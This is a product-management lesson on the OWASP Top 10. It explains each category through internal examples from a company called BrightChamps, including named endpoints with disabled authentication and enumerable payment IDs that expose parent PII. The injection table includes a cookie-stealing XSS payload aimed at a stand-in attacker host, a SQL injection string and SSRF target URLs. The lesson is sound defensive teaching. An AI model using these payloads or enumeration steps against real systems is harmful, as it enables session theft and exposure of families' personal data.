---
lesson: OWASP Top 10 for PMs
module: 09 — security and scale
tags: tech
difficulty: working
prereqs:
  - 09.01 — Authentication vs Authorization: Broken Access Control (#1 OWASP) is the authorization design failure discussed in detail there; this lesson places it in the broader OWASP context
  - 09.02 — GDPR & Data Privacy for PMs: security vulnerabilities (OWASP) are often the mechanism by which privacy violations (GDPR exposure) occur; understanding both helps a PM specify secure product requirements
writer: staff-engineer-pm
qa_panel: Staff Engineer, Senior PM, Junior PM Reader
kb_sources:
  - technical-architecture/api-specifications/api-feed-presigned-url-create.md
  - technical-architecture/api-specifications/api-package-payment-details-get.md
profiles:
  foundation:
    - Non-technical Business PM
    - Aspiring PM
    - Designer PM
    - MBA PM
  working:
    - Growth PM
    - Consumer Startup PM
    - B2B Enterprise PM
  strategic:
    - Ex-Engineer PM
    - Senior PM
    - Head of Product
status: ready
last_qa: 2026-04-09
---

# ═══════════════════════════════════
# LEVEL 1 — FOUNDATION
# ═══════════════════════════════════

## F1 — The world before this existed

Web application security was treated as a specialist domain through the early 2000s. Security was something you brought in after you built the product — a penetration tester who'd probe the finished system, find issues, and hand back a report. Development teams didn't think about security during design; they thought about security after breaches.

This model failed repeatedly. The same classes of vulnerabilities appeared across different companies, different codebases, different products: SQL injections that let attackers read entire databases, cross-site scripting attacks that stole users' session tokens, broken authentication that let attackers impersonate legitimate users. The vulnerabilities were predictable and preventable, but because security wasn't built into the development process, they kept being shipped.

In 2003, the Open Web Application Security Project (OWASP) published its first Top 10 list — the ten most critical web application security vulnerabilities based on data from thousands of applications. The list wasn't written for security specialists. It was written to help developers and product teams understand which vulnerabilities mattered most, explained simply enough to incorporate into everyday software development.

The OWASP Top 10 has been updated periodically (most recently 2021) as the threat landscape has evolved. It remains the most widely referenced security standard in web and API development. For product managers, it's a vocabulary and a checklist: these are the categories of vulnerabilities your engineering team must actively mitigate, and as a PM, you need to understand them well enough to write secure requirements, recognize when engineering flags security concerns, and make tradeoffs about security vs. speed with informed judgment.

## F2 — What it is, and a way to think about it

> **OWASP (Open Web Application Security Project):** A nonprofit foundation that produces freely available security guidance, tools, and standards for web application security. The OWASP Top 10 is its most widely known output — a list of the ten most critical security vulnerability categories.

> **Vulnerability:** A weakness in a system that can be exploited by an attacker to cause harm: gain unauthorized access, steal data, disrupt service, or execute malicious code. Vulnerabilities are not bugs in the traditional sense — a system can work exactly as designed while having a vulnerability. The vulnerability is in what the design allows that it shouldn't.

> **Exploit:** The technique an attacker uses to take advantage of a vulnerability. A SQL injection exploit sends malicious code disguised as a database query. A Cross-Site Scripting (XSS) exploit injects malicious scripts into web pages viewed by other users.

> **Attack surface:** The total set of points where an attacker can interact with a system: APIs, input forms, file upload endpoints, URL parameters, cookies, headers. Every new feature that accepts user input expands the attack surface.

### The 2021 OWASP Top 10

| # | Category |
|---|---|
| 1 | Broken Access Control |
| 2 | Cryptographic Failures |
| 3 | Injection |
| 4 | Insecure Design |
| 5 | Security Misconfiguration |
| 6 | Vulnerable and Outdated Components |
| 7 | Identification and Authentication Failures |
| 8 | Software and Data Integrity Failures |
| 9 | Security Logging and Monitoring Failures |
| 10 | Server-Side Request Forgery (SSRF) |

### A mental model: Building code violations

Think of OWASP vulnerabilities like building code violations. A building inspector doesn't need to understand the physics of structural failure to recognize that a load-bearing wall is missing. They use a standardized checklist of known failure patterns. 

**OWASP is that checklist for software:** known categories of failure that, if present, will eventually cause harm. A PM who knows the checklist can ask the right questions about each new feature, even without deep security expertise.

## F3 — When you'll encounter this as a PM

### During security reviews and threat modeling

**Situation:** Engineering introduces security requirements as part of a feature's acceptance criteria (e.g., "this endpoint must validate authorization before returning user data")

**Your role:** Understand which OWASP category is being mitigated so you can evaluate the requirement as a genuine security control rather than over-engineering.

### When reviewing API designs that handle sensitive data

**Real example:**

### BrightChamps — Commented-out auth middleware

**What:** The `POST /v1/feed/presigned-url` endpoint has `auth: None (auth middleware commented out)`. Any user can generate S3 upload URLs for any userId/userType combination.

**Why this fails:** Users can upload content attributed to any other user.

**OWASP categories:** 
- Identification and Authentication Failure (OWASP #7)
- Broken Access Control (OWASP #1)

**Takeaway:** A PM reviewing this endpoint should recognize both issues without engineering explanation.

### When a feature involves user-submitted content

| Risk | Trigger | Mitigation to support |
|------|---------|----------------------|
| **Injection (OWASP #3)** | Users upload files, submit forms, or provide free-text input | HTML sanitization, server-side validation |
| **XSS (falls under Injection in OWASP 2021)** | Free-text fields rendered in UI | Input encoding, Content Security Policy |

When engineering asks "does this field need HTML sanitization?" or "should we validate file types server-side?" — these are specific Injection mitigations you should support rather than de-prioritize.

### When integrating third-party components or libraries

⚠️ **Vulnerable and Outdated Components (OWASP #6)**

Your product's security is partly determined by the security of every npm package, Python library, or SaaS integration you use. When you approve integrating a new third-party component:

- You add to component dependency maintenance burden
- A critical vulnerability in a dependency requires an urgent hotfix, not a planned sprint item

### When security incidents occur

Understanding OWASP categories helps you triage incidents correctly and accelerate diagnosis:

| Incident report | Maps to | Investigation path |
|-----------------|---------|-------------------|
| "A user reported seeing another user's payment data" | Broken Access Control or cryptographic/encoding failure | Access control audit, data exposure scope |
| "A user reported our site is injecting scripts into their browser" | XSS (Injection) | Client-side validation, input sanitization review |
# ═══════════════════════════════════
# LEVEL 2 — WORKING KNOWLEDGE
# ═══════════════════════════════════

## W1 — How it actually works

### The OWASP Top 10 for PMs: what each means and how to spot it

#### #1 — Broken Access Control (most critical)

> **Broken Access Control:** The server fails to verify that an authenticated user has permission to perform the requested action on a specific resource. Any authenticated user can access any other user's data, or perform actions requiring higher permissions (privilege escalation).

| What to spot | Red flag |
|---|---|
| Endpoints accepting user ID as parameter | No verification that requester is authorized to access *that specific user's* data |
| Authentication present but authorization missing | User is logged in, but can access other users' resources |
| Privilege escalation | Non-admin user can perform admin actions |

**PM indicator:** Any endpoint that accepts a user ID as a parameter and returns data for that user should verify the requesting user is authorized to access that specific user's data — not just that they're authenticated.

### Company — BrightChamps

**What:** The `GET /v1/student/details` endpoint has `auth: None` — no authentication at all. Any caller supplying a valid `studentId` or `referralCode` gets full student and parent data including performance records.

**Why:** This is the most severe form of Broken Access Control: missing not just authorization, but authentication entirely.

**Takeaway:** Authentication must be a first-level requirement, not a feature enhancement.

---

#### #2 — Cryptographic Failures

> **Cryptographic Failures:** Sensitive data (passwords, payment information, PII, session tokens) is stored or transmitted without adequate encryption.

| Failure type | Example | Impact |
|---|---|---|
| Plaintext storage | Passwords, MPINs stored as plaintext | Any breach = instant credential compromise |
| Weak hashing | MD5, SHA1 for password hashing | Attackers can reverse-engineer passwords |
| Unencrypted transmission | HTTP instead of HTTPS | Session tokens, passwords visible in transit |
| Insecure token storage | Tokens in browser localStorage | XSS attacks can steal tokens |

**PM indicator:** Any sensitive data field in the product — passwords, payment details, PII — requires a specific question: how is this encrypted at rest and in transit?

### Company — BrightChamps

**What:** The KB flags MPINs stored in plain text on Google Sheets as Critical severity.

**Why:** Plaintext credential storage is a textbook Cryptographic Failure. If the sheet is accessed by an unauthorized person, every user's MPIN is compromised.

**Takeaway:** Credentials and sensitive data require encryption specification in requirements, not assumption.

---

#### #3 — Injection

> **Injection:** User-supplied input is interpreted as code or commands rather than data. Common variants include SQL injection, NoSQL injection, and Cross-Site Scripting (XSS).

| Attack type | How it works | Example |
|---|---|---|
| SQL Injection | Attacker modifies SQL query via user input | Input: `' OR 1=1 --` → Returns all users instead of matching one |
| XSS (Cross-Site Scripting) | Malicious JavaScript injected into page | Input: `<script>document.location='attacker.com?token='+document.cookie</script>` → Executes in viewer's browser, steals session token |
| NoSQL Injection | Attacker modifies NoSQL query syntax | Similar impact: exposes or manipulates data |

**PM indicator:** Any feature that accepts user input and stores or displays it requires a question: is input sanitized/escaped before storage or display?

---

#### #4 — Insecure Design

> **Insecure Design:** Security controls are missing from the system architecture from the start. This is fundamentally a PM-level decision about what security controls to include in requirements.

| Design mistake | What should have happened |
|---|---|
| Authentication requirement disabled (even temporarily) | Acceptance criteria explicitly requires: "auth middleware enabled in production" |
| Security controls added as afterthought | Security controls built into initial design, not retrofitted |
| No security requirements in PRD | PRD lists all authentication/authorization requirements upfront |

**PM indicator:** Any feature with disabled auth middleware, commented-out security checks, or "temporary" workarounds is an Insecure Design failure in production.

⚠️ **CRITICAL:** Disabled authentication in code must be re-enabled before production deployment. This is not technical debt — it's a blocking security requirement.

### Company — BrightChamps

**What:** The `POST /v1/feed/presigned-url` endpoint has authentication middleware commented out: `// authMiddleware()`.

**Why:** Anyone can call this endpoint to generate an S3 upload URL for any userId/userType combination. An attacker can upload content attributed to any student or teacher.

**Takeaway:** "Auth middleware must be enabled in production" must be an explicit acceptance criterion, not an assumption.

---

#### #5 — Security Misconfiguration

> **Security Misconfiguration:** Insecure default settings are left in place. Includes default credentials, unnecessary services enabled, overly verbose error messages, and publicly accessible storage.

| Misconfiguration | Risk |
|---|---|
| Error messages expose stack traces | Attacker learns internal function names, database structure, service architecture |
| Default credentials unchanged | Attacker gains admin access with public/default password |
| S3 buckets publicly readable | Attacker downloads all stored data |
| Verbose error logging in production | Attacker maps internal systems via error messages |

**PM indicator:** Error messages that expose internal information ("Database error: SELECT * FROM users WHERE id=...") are Security Misconfiguration. Production should use generic messages: "Something went wrong. Please try again."

### Company — BrightChamps

**What:** The `POST /v1/package-payment` endpoint returns: `"message": "error in getPackagePaymentDetails: Unexpected token"` for invalid Base64 input.

**Why:** This exposes internal function and service names to any caller, confirming internal API naming conventions to potential attackers.

**Takeaway:** Error messages in production must never expose internal system details.

---

#### #6 — Vulnerable and Outdated Components

> **Vulnerable and Outdated Components:** Libraries, frameworks, and dependencies with known vulnerabilities are used without updates.

| Real example | Impact | Timeline |
|---|---|---|
| Apache Struts unpatched | 2017 Equifax breach: 147 million records | Patch available 2 months before breach |
| Outdated dependency with CVE | Attacker exploits known vulnerability | Easily automated attacks |

**PM indicator:** "We need to update this library because there's a critical CVE" is a legitimate security requirement that should be treated with P1 urgency — not as tech debt. Security patching directly reduces breach risk.

**What this reveals:** CVE (Common Vulnerabilities and Exposures) fixes are maintenance, not features. They belong in sprint planning alongside bug fixes.

---

#### #7 — Identification and Authentication Failures

> **Identification and Authentication Failures:** Authentication mechanisms are implemented incorrectly, including weak passwords, unrate-limited brute force, invalidated session tokens, and inconsistent auth requirements.

| Failure pattern | Why it's dangerous |
|---|---|
| Auth required on some endpoints, missing on others | Attacker bypasses auth by finding unprotected endpoint |
| Weak password requirements | Attackers brute-force credentials easily |
| No brute-force rate limiting | Attacker tries thousands of password combinations |
| Session tokens not invalidated on logout | Stolen token remains valid indefinitely |
| Auth middleware commented out or disabled | System cannot identify who is making requests |

**PM indicator:** Any "public" endpoint that the feature description implies should require authentication is an Authentication Failure waiting to happen. Auth requirements belong in the PRD from day one, not as an afterthought.

### Company — BrightChamps

**What:** The `POST /v1/feed/presigned-url` endpoint has auth middleware commented out. The caller can pass any `userId` they want and the endpoint accepts it.

**Why:** The system cannot identify who is making the request, so any attacker can impersonate any user.

**Takeaway:** Authentication requirements must be in the PRD. Disabled auth in code is a blocking production issue.

---

#### #8 — Software and Data Integrity Failures

> **Software and Data Integrity Failures:** Code or data is loaded from untrusted sources without integrity verification, or untrusted data is deserialized and executed.

| Failure type | Example | Risk |
|---|---|---|
| Unsigned software updates | Malicious code injected into update | Attacker gains code execution on all user devices |
| Insecure deserialization | Untrusted data deserialized without validation | Malicious objects executed |
| Unverified encoded data | User supplies Base64 payload, server trusts contents | Attacker forges payment IDs, retrieves other users' data |
| Unverified CI/CD sources | Pipeline pulls code from untrusted repository | Malicious code enters production |

**PM indicator:** Any system that processes user-supplied encoded or serialized data must validate the contents server-side, not trust the encoding itself. Base64 is encoding, not encryption or authentication.

### Company — BrightChamps

**What:** The `POST /v1/package-payment` endpoint decodes a Base64-encoded JSON payload (`data` field) and uses `payment_initiation_id` from within it without server-side validation that the payment belongs to the requesting user.

**Why:** Any caller can encode their own JSON with any `payment_initiation_id` and retrieve payment details for any order.

**Takeaway:** Base64 encoding is not security. User-supplied encoded data must be validated server-side before use.

---

#### #9 — Security Logging and Monitoring Failures

> **Security Logging and Monitoring Failures:** The system doesn't generate adequate security logs, or existing logs aren't monitored. Without logging, attacks proceed undetected.

| Gap | Consequence |
|---|---|
| No audit logs for sensitive operations | Failed attacks leave no trace |
| Logs not monitored in real-time | Breach detection takes months (average ~200 days) |
| No alerts for suspicious activity | Attacker operates freely without triggering alarms |
| Logs easily deleted or modified | Attacker covers tracks, destroying evidence |

**PM indicator:** Features that handle sensitive operations (login, payment, admin actions, data access) should generate security events in logs. The absence of security logging is itself an OWASP vulnerability — not because it enables attacks, but because it prevents detection.

**What this reveals:** You cannot secure what you cannot see. Logging and monitoring are foundational security controls, not optional.

---

#### #10 — Server-Side Request Forgery (SSRF)

> **Server-Side Request Forgery (SSRF):** An attacker tricks the server into making requests to internal resources on the attacker's behalf. Typically exploited via features that accept URLs and make server-side HTTP requests.

| SSRF vector | Exploitation example | Impact |
|---|---|---|
| Webhook URL configuration | Attacker supplies internal IP (e.g., `http://169.254.169.254`) | Server makes request to AWS metadata endpoint, exposes credentials |
| Image import from URL | Attacker supplies `http://localhost:8080/admin` | Server fetches internal admin page contents |
| PDF generation from URL | Attacker supplies URL pointing to internal service | Server renders internal service data into PDF |
| Redirect URL | Attacker supplies internal service URL | Server makes request, exposing response to attacker |

**PM indicator:** Any feature where users supply a URL that the server uses to make an outbound request is an SSRF vector. Webhook configurations, image import from URL, PDF generation, and integration callback URLs all require server-side validation that the URL targets an expected domain, not internal services.

---

### The two BrightChamps security gaps in detail

The KB reveals two authentication-disabled endpoints that represent real, production security risks:

#### Gap 1: `POST /v1/feed/presigned-url` — auth commented out

⚠️ **CRITICAL**

| Aspect | Details |
|---|---|
| **The vulnerability** | Auth middleware is literally commented out: `// authMiddleware()` |
| **What an attacker can do** | Generate S3 upload URLs for any userId/userType combination |
| **Attack scenario** | Attacker generates upload URLs for a teacher's userId, uploads inappropriate content, content is attributed to the teacher in feed system |
| **Current (insufficient) control** | Redis rate limiting (60-second cooldown per userId) — but it's per userId, not per source IP |
| **Why rate limiting fails** | Attacker with list of valid userIds can upload content attributed to every user with minimal rate limiting impact |

**Takeaway:** Disabled auth middleware in production is a blocking issue. Auth requirement must be in acceptance criteria and verified in production before release.

---

#### Gap 2: `POST /v1/package-payment` — no auth, returns payment and PII

⚠️ **CRITICAL**

| Aspect | Details |
|---|---|
| **The vulnerability** | No authentication required; accepts Base64-encoded `payment_initiation_id` |
| **Data returned** | Full payment details, package information, student records (name, grade, referralCode), parent records (name, email, phone, country) |
| **How to exploit** | Guess or enumerate valid `payment_initiation_id` (auto-incrementing integer) |
| **Impact per request** | Attacker retrieves another family's full payment and personal data |
| **OWASP categories** | #1 Broken Access Control + #2 Cryptographic Failures (Base64 is encoding, not encryption) |

**Takeaway:** Auto-incrementing IDs + no authentication + no encryption = enumeration attacks exposing PII. Requires immediate: (1) authentication on endpoint, (2) server-side validation that payment belongs to requesting user, (3) non-sequential or opaque IDs.

## W2 — The decisions this forces

### Decision 1: Security requirements belong in the PRD — not in code review

The OWASP Top 10 is the PM's evidence that security requirements must be specified at design time. Most vulnerabilities on the list are caused by **missing requirements, not engineering mistakes**. The auth middleware on `POST /v1/feed/presigned-url` was disabled during testing and never re-enabled because "enable auth on production" wasn't an explicit acceptance criterion.

#### Five security questions every data-handling feature must answer:

| Requirement | Why it matters | What to specify in PRD |
|---|---|---|
| **Authentication** | Ensures users are who they claim | Which service/middleware enforces it? |
| **Authorization** | Ensures users can only access their own data | Which roles are allowed? Is data scoped to requesting user? |
| **Input validation** | Prevents injection and malformed data attacks | What inputs accepted? What are validation rules? What happens to invalid input? |
| **Error handling** | Prevents information leakage | What does error response contain? Does it expose internal info? |
| **Security logging** | Enables breach detection and forensics | What security events should be logged for this operation? |

> **OWASP mapping:** These five controls directly mitigate vulnerabilities in OWASP #1, #3, #4, #5, and #9—not theoretical risks, not security theater.

---

### Decision 2: Tradeoffs between security and shipping speed

Every security control adds friction: input validation adds code, auth middleware adds latency, error sanitization requires engineering effort. The PM will face requests to skip or defer these controls.

#### When deferral is acceptable vs. required:

| Scenario | Deferral OK? | Rationale |
|---|---|---|
| **Low-sensitivity features, no user data, low attack motivation** (e.g., admin dashboard for 5 internal employees) | ✅ Yes | Limited exposure surface |
| **PII, payment data, session tokens, user-generated content endpoints** | ❌ No | Production vulnerabilities, not theoretical |

⚠️ **Security requirements are acceptance criteria, not optional enhancements.** A feature does not ship without them—just as it doesn't ship without core functional requirements.

**The right process:**
1. Security requirements specified in PRD alongside functional requirements
2. Authentication, authorization, and input validation required before production ship
3. No exceptions for payment data, PII, or session tokens

*BrightChamps example:* A feed upload endpoint with disabled auth creates content integrity risk; a payment endpoint with no auth exposes customer PII. These are documented production vulnerabilities, not edge cases.

---

### Decision 3: Third-party component risk and patch velocity

Every third-party library or integration expands the attack surface (OWASP #6). The PM's role is not to evaluate every npm package—but to ensure three systems exist:

| System | Owner | SLA |
|---|---|---|
| **Receiving advisories** | DevOps/Eng | GitHub Dependabot, npm audit, Snyk configured |
| **Acting on critical patches** | PM/Eng | P1 sprint prioritization, not backlog items |
| **Evaluating new dependencies** | Eng/Security | Review before `package.json` adoption, not after |

⚠️ **The Equifax precedent matters:** A $1.5B-revenue company couldn't justify 2 months to patch a known critical vulnerability. The result: the largest personal data breach in US history.

**The question you must answer:** What is our patch response SLA for critical CVEs in production dependencies?

## W3 — Questions to ask your engineering team

### Quick Reference
| Question | Security Focus | Red Flag Answer |
|----------|---|---|
| OWASP testing | Systematic security practice | "We had a pen test 2 years ago" |
| Auth disabled | Public endpoint safety | "We don't know" |
| Input validation | Injection prevention | "We trust the frontend" |
| Error responses | Information disclosure | Stack traces in production |
| CVE handling | Dependency management | Nobody owns it |
| Cloud permissions | Infrastructure configuration | Ad hoc auditing |
| Security logging | Attack detection | App errors only, no security events |

---

### 1. OWASP vulnerability testing

**Question:** Which OWASP vulnerabilities have been explicitly tested or mitigated in the last 6 months, and what's the process for ongoing testing?

*What this reveals:* Whether security testing is systematic or ad hoc.

**Poor signal:** "We had a pen test 2 years ago"
- Describes a point-in-time snapshot of security that doesn't reflect the current codebase

**Strong signal:** Active security testing program
- Automated scanning in CI/CD pipelines
- Periodic penetration tests
- Static analysis tools integrated into development workflow
- Security treated as ongoing practice, not one-time event

---

### 2. Authentication coverage on production endpoints

**Question:** Do any production endpoints currently have authentication disabled or commented out?

*What this reveals:* Whether your team has visibility into public endpoint safety.

⚠️ **Why this matters:** The answer may be uncomfortable. This is a direct security audit question.

**Poor signal:** "We don't know"
- Indicates need for immediate audit: enumerate all public endpoints and verify whether they should require authentication

**Strong signal:** Clear inventory of all endpoints with documented authentication requirements

---

### 3. Input validation and sanitization

**Question:** How do we validate and sanitize user input before it reaches the database or is rendered to other users?

*What this reveals:* Whether Injection attacks (OWASP #3) are actively mitigated.

| Attack Type | Required Mitigation |
|---|---|
| **SQL Injection** | ORM with parameterized queries |
| **Cross-Site Scripting (XSS)** | HTML escaping before rendering user content in browser |
| **Malicious File Upload** | File type validation for all uploads |

⚠️ **Red flag answer:** "We trust the frontend to send valid data"
- Frontend validation is not a security control
- Always validate on the backend

---

### 4. Error response format in production

**Question:** What does our error response format look like for invalid requests — do we return stack traces or internal error messages in production?

*What this reveals:* Security Misconfiguration (OWASP #5) and information disclosure risk.

**Real example — Poor signal:**
```
POST /v1/package-payment
Response: "error in getPackagePaymentDetails: Unexpected token"
```
Exposes internal function names and implementation details.

**Strong signal:**
- Generic error messages in production
- Internal error details logged server-side only
- Example: `"Invalid request. Please contact support if this persists."`

---

### 5. CVE response process for dependencies

**Question:** How do we handle critical CVEs (vulnerabilities) in our npm/pip/maven dependencies — what's the response SLA and who owns it?

*What this reveals:* Whether Vulnerable and Outdated Components (OWASP #6) is managed systematically.

**Required elements:**

| Element | Expected Answer |
|---|---|
| **Monitoring tool** | Dependabot, Snyk, npm audit, or equivalent |
| **Ownership** | Named person or team responsible for alerts |
| **Response SLA — Critical** | 24–72 hours (industry standard) |
| **Response SLA — High** | 7 days |

⚠️ **Process gap:** "Nobody owns this" or no monitoring tool in place
- Creates systematic vulnerability exposure
- Requires immediate remediation

---

### 6. Cloud storage and permissions auditing

**Question:** For our S3 buckets and cloud storage — are any configured with public read access, and what's the process for auditing cloud resource permissions?

*What this reveals:* Security Misconfiguration at infrastructure level.

⚠️ **Critical risk area:** Public S3 buckets are one of the most common cloud misconfigurations.

| Consequence | Example |
|---|---|
| Accidental data exposure | Capital One breach (2019) |
| Unauthorized cost spikes | Attackers using compute resources |
| Credential/key exposure | API keys stored in public storage |

**Strong signal:** Regular permission audits (monthly or quarterly) with documented findings and remediation.

---

### 7. Security logging and alerting

**Question:** What security events do we log, and do we have alerts on anomalous patterns — like unusually high error rates, authentication failures, or unusual API call volumes?

*What this reveals:* Security Logging and Monitoring (OWASP #9) and attack detection capability.

**Strong signal — logged security events:**
- Failed login attempts
- Authorization failures
- Admin/privileged actions
- Data access patterns

**Strong signal — alerting:**
- 10x normal error rate (may indicate brute force or scanning attack)
- Unusual API call volume spikes
- Repeated authorization failures from single IP/user
- Access from new geographic locations

⚠️ **Detection gap:** "We log application errors but nothing security-specific"
- Means no attack detection capability
- Cannot identify breaches in real time

## W4 — Real product examples

### BrightChamps — Auth middleware as a PRD requirement

**What:** Two production API endpoints with authentication completely disabled:
- `POST /v1/feed/presigned-url` — auth middleware commented out; any caller can generate S3 upload URLs for any userId
- `POST /v1/package-payment` — no auth check; accepts Base64-encoded payment ID and returns full payment details, student records, and parent PII (email, phone)

**Why it matters:** 
- Auth middleware isn't an engineering default—it's a PRD acceptance criterion
- Base64 is *encoding*, not *encryption*—enumerable, auto-incrementing payment IDs (1, 2, 3...) allow attackers to iterate through all payment records
- Compounded by OWASP #8 (Data Integrity): presenting encoding as a security mechanism masks the actual vulnerability

**Takeaway:** Security controls must be explicit, testable requirements in your specification. Don't assume "of course we'll add auth"—write it into the definition of done.

---

### Equifax 2017 — Known vulnerability, unpatched for 78 days

**What:** 
- March 2017: Equifax security team notified of CVE-2017-5638 (Apache Struts critical vulnerability with public exploit available)
- May 12, 2017: Attackers exploited the unpatched vulnerability
- Breach continued 78 days before detection
- 147 million records compromised: SSNs, addresses, financial data
- Settlement cost: $575 million

**Why it matters:** OWASP #6 (Vulnerable and Outdated Components) at maximum scale. A patch existed. The decision not to deploy it had consequence.

**Takeaway:** Critical CVE patches are not nice-to-haves or "tech debt"—they are incident prevention. Build patch velocity into your release planning.

⚠️ **For your roadmap:** A known, unpatched CVE in production is an active risk, not a backlog item.

---

### Facebook/Cambridge Analytica — API permissions as security design

**What:** Cambridge Analytica harvested data on 87 million Facebook users without consent via Graph API. The API allowed third-party apps to access not just the authorizing user's data, but also the data of *all their friends*.

**Why it matters:** This is OWASP #1 (Broken Access Control) at platform scale. Users had no reasonable expectation that authorizing one app would expose their friends' private information. The vulnerability was in the API design itself, not a code defect.

Facebook's response: Shut down the Friends API.

**Takeaway:** "What data can third-party apps access through our APIs?" is a PRD question, not a later security review. API permissions are product design decisions. Document and review them like feature specs.

---

### Log4Shell (2021) — Injection in unexpected places

**What:** 
- Vulnerability: CVE-2021-44228 in Log4j (Java logging library)
- Attack vector: Attackers embed specially crafted strings in any user-supplied input (User-Agent header, username, etc.). When Log4j logs the string, it executes embedded code.
- Impact: Virtually every Java application affected (Apple, Amazon, Minecraft, banking, healthcare)
- Severity: 10/10 (maximum)

**Why it matters:** OWASP #3 (Injection) isn't just in user-facing inputs—it exists anywhere user-supplied content is *processed*, including logging systems. Most teams don't think of logging as an attack surface.

**Takeaway:** Map every place user-supplied data flows through your system. Injection attacks happen where data is *processed*, not just where it's stored or displayed.

⚠️ **For your audit:** Review your logging layer for injection vectors. User input in logs = user input processed by your application.
# ═══════════════════════════════════
# LEVEL 3 — STRATEGIC DEPTH
# ═══════════════════════════════════

## S1 — What breaks and why

### Security debt vs. technical debt

⚠️ **Security debt has a different risk model than technical debt**

| Aspect | Technical Debt | Security Debt |
|--------|---|---|
| **Compounding pattern** | Gradual degradation | Invisible until exploitation |
| **System behavior** | Still works, harder to modify | Functions normally until breach |
| **Cost realization** | Continuous friction | Sudden, potentially catastrophic |
| **Warning signs** | Visible in velocity, maintenance | No visible indicators |

> **The actuarial model:** Assess security risk not as "has this been exploited?" but as "what's the probability of a material breach in the next 12 months given our current attack surface and known vulnerabilities?"

**Your challenge:** Security risk is invisible on the product roadmap until it becomes a breach, at which point it's too late to prevent.

---

### Insecure design can't be patched

⚠️ **OWASP #4 (Insecure Design) is the hardest vulnerability category to remediate**

| Vulnerability Type | Remediation Approach | Effort Level |
|---|---|---|
| Injection | Add input validation | Low-medium |
| Broken Access Control | Add server-side authorization checks | Low-medium |
| **Insecure Design** | **Rearchitect fundamentally** | **High** |

**Examples of design-time security failures:**
- System without multi-tenancy data isolation cannot be made secure by adding validation — the data model must change
- System where authentication is optional requires rearchitecting authentication to be required by default across all endpoints

**For PMs:** OWASP #4 failures that are most expensive to fix are the ones introduced at design time when security was deprioritized in favor of speed.

---

### Security testing reveals invisible vulnerabilities

**Code review alone misses adversarial attack patterns**

Many OWASP vulnerabilities don't appear in standard code review because they require end-to-end testing with an adversarial mindset:

- **Authorization bypass via parameter:** An authorization check using `userId` from token may be bypassed if the endpoint accepts a different `userId` parameter that's never validated against the token
- **Incomplete parameterization:** A SQL injection vulnerability using parameterized queries in the main query may be vulnerable in a dynamically constructed `ORDER BY` clause that engineers didn't parameterize

**What this reveals:** Adversarial testers try inputs that engineers assume would never be sent.

**Your testing strategy:**
- **Automated DAST** (Dynamic Application Security Testing) — finds runtime vulnerabilities
- **Periodic penetration tests** — reveals end-to-end attack chains

## S2 — How this connects to the bigger system

| Concept | Connection |
|---|---|
| **Authentication vs. Authorization (09.01)** | OWASP #1 (Broken Access Control) and #7 (Authentication Failures) are the authorization and authentication failures described in 09.01, placed in the OWASP classification framework. The BrightChamps disabled-auth examples appear in both lessons for this reason. |
| **GDPR & Data Privacy (09.02)** | OWASP vulnerabilities are often the mechanism by which GDPR breaches occur: a Broken Access Control vulnerability causes the unauthorized data access that triggers GDPR breach notification; a Cryptographic Failure means PII stored in plaintext must be treated as a breach when systems are compromised. |
| **API Authentication (01.02)** | OWASP #7 (Authentication Failures) in API contexts is directly about the API authentication mechanisms covered in 01.02: JWT validation, API key handling, session token management. |
| **Incident Management (09.05)** | OWASP #9 (Security Logging and Monitoring Failures) exists because without logging, incidents are undetectable. The incident management process depends on the security logging infrastructure that OWASP #9 requires. |
| **Feature Flags (03.10)** | ⚠️ Feature flags that disable security features in production (like commented-out auth middleware) are an operational risk: flags get left in the wrong state. Feature flags *can* gate security features during rollout (enable auth on a new endpoint for 10% of traffic before full rollout), but only when actively managed. |

## S3 — What senior PMs debate

### Shift left vs. security gating at release

| Approach | Cost of Discovery | Trade-off |
|----------|-------------------|-----------|
| **Shift left** (design/code review) | Minutes to fix | Adds sprint friction for low-risk features |
| **Pre-release testing** (penetration test) | Days to fix | Deferred risk, narrow window |
| **Production breach** | Millions in impact | Unacceptable |

> **Shift left:** Moving security testing earlier in development — into design reviews and code review, rather than only pre-release penetration testing.

**The counterargument to pure shift left:** Most features never get exploited. Applying heavy security review to every sprint is overhead.

**Practical resolution (risk-based approach):**
- ✅ Automated security scanning in CI/CD — catches common issues, zero human overhead
- ✅ Design-time security review — applies only to high-risk features (payment, auth, PII handling)
- ✅ Periodic penetration testing — adversarial discovery on full system

*What this reveals:* Security effort should match risk, not be uniform across all features.

---

### The build vs. buy debate for security infrastructure

| Decision | Control | Risk | Best for |
|----------|---------|------|----------|
| **Build your own auth** | Full control, no vendor dependency | Common subtle mistakes (JWT verification, session invalidation) | Specialized teams only |
| **Buy managed auth** (Auth0, Cognito, Okta) | Limited control, vendor dependency | Vendor risk, but lower implementation risk | Growth-stage companies |

> **Common failure pattern:** Teams build authentication from scratch (seems simple), introduce OWASP #7 vulnerabilities (JWT verification without signature check, tokens not invalidated on logout), and discover too late.

**Why managed auth wins for growth-stage companies:** A specialist vendor's authentication implementation is statistically more secure than a startup engineering team's first-pass implementation. The implementation risk transfer outweighs vendor lock-in.

*What this reveals:* For security infrastructure, specialization matters more than control.

---

### Bug bounty programs as security strategy

⚠️ **Security & Operational Risk**

Bug bounty programs pay external researchers to find vulnerabilities in production systems.

| Benefit | Risk |
|---------|------|
| Adversarial testing at scale (thousands of researchers) | Advertises vulnerabilities to attackers |
| Finds vulnerabilities internal teams would never discover | Risk of premature disclosure before fix |
| Responsible disclosure programs reduce disclosure risk | Requires operational maturity to fix quickly |

> **Responsible disclosure:** Defined fix windows between vulnerability discovery and public disclosure, balancing researcher incentives with remediation time.

**For companies with known unpatched vulnerabilities** (like disabled auth endpoints): A bug bounty program would rapidly surface additional issues. Whether this is a forcing function or existential risk depends entirely on the company's ability to fix vulnerabilities quickly.

*What this reveals:* Bug bounties amplify existing security debt—only deploy when you can remediate at speed.